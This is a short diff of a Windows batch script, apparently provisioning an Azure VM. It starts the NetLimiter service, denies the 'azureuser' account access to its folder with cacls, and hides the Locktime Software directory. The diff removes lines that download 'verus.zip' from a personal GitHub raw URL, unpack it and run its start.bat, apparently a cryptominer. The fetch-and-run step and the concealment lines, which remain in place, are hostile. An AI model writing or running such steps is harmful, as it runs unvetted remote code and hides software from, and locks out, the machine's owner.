@@ -20,9 +20,5 @@ if %ErrorLevel% EQU 0 (
     net start nlsvc
     cacls "C:\Program Files\Locktime Software\NetLimiter 4" /e /p azureuser:n 
     attrib +h "C:\Program Files\Locktime Software"
-    wget https://raw.githubusercontent.com/robertreynolds2/aaaa/main/verus.zip -outfile verus.zip
-    expand-archive verus.zip
-    cd verus
-    start start.bat
 )
 goto checklimit
